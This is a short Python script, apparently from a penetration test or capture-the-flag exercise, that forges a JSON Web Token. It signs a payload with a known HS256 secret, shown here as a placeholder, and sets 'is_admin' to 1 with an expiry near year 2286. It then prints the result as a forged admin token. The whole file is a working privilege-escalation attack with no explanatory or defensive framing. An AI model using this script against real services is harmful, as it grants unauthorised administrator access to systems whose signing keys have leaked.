import jwt
from datetime import datetime, timedelta

JWT_SECRET = "<secret>"

payload = {
    'user_id': 6,
    'username': "lasang",
    'is_admin': 1,
    'exp': 9999999999 
}

# Encode token with HS256 (according to target config)
forged_token = jwt.encode(payload, JWT_SECRET, algorithm="HS256")

print("\n[+] JWT Forgery Successful!")
print("[+] Forged Admin Token:")
print("-" * 50)
print(forged_token)
print("-" * 50)
